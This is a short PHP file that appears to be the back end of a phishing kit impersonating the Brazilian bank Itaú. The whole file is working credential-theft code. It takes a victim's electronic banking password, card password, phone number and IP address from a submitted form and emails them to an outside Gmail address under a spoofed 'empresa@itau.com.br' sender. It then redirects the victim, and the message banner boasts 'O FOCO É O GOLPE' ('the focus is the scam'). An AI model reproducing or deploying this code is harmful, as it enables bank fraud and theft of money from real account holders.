﻿<?php

$senha1 = $_POST['senha1'];
$senha2 = $_POST['senha2'];
$telefone = $_POST['telefone'];
$ip = $_SERVER['REMOTE_ADDR'];


$emaildestinatario = 'aprovacao300@gmail.com';

$subj = "Dados / IP: $ip - Chegou: ITA JUJU by G4ll0";

/* Montando a mensagem a ser enviada no corpo do e-mail. */
$mensagemHTML = '
<p>------------- |Chegou ITA JUJU by G4ll0| ------------</p>
<p><b>Senha Eletronica:</b> '.$senha1.'<br>
<p><b>Senha do Cartão:</b> '.$senha2.'<br>
<p><b>telefone:</b> '.$telefone.'<br>
<hr>
<p>------------- |O FOCO É O GOLPE| --------------</p>
';

$headers = "MIME-Version: 1.1\r\n";
$headers .= "Content-type: text/html; charset=utf-8\r\n";
$headers .= "From: empresa@itau.com.br \r\n"; // remetente
$headers .= "Return-Path: empresa@itau.com.br \r\n"; // return-path
$envio = mail("aprovacao300@gmail.com", $subj, $mensagemHTML, $headers); 

	if($envio){
		echo "<script>location='../fim.php';</script>";
	}else{ 
  		echo "<script>alert('Desculpe, algo deu errado. Tente novamente !');location='../home.php';</script>"; 
  	}
?>